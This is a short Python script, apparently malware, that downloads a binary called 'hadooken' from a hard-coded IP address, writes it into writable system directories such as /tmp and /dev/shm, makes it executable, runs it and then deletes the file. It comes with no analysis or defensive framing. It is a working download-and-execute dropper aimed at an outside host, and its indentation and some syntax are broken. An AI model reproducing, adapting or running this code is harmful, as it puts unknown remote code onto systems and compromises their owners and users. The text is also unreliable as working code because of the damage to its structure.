
import platform
import os
import urllib.request
def download_and_execute(url, target_path):
try:
response = urllib.request.urlopen(url)
if response.getcode() == 200:
data = response.read()
with open(target_path, "wb") as code: code.write(data)
os.chmod(target_path, 00777)
cmd = '{}'.format(target_path) os.system(cmd)
print("Command OK")
return True
except Exception:
pass
finally:
if os.path.exists(target_path):
os.remove(target_path)
return False
if platform.architecture()[0] =="64bit":
url = "http://185.174.136.204/hadooken"
for target_dir in ["/tmp", "/var/tmp", "/dev/shm", "/run/user", "/usr/local/share", "/var/run", "/opt", "/", "/mnt"]: target_path = os.path.join(target_dir, "hadooken")
if download_and_execute(url, target_path):
print("Download Already OK")
break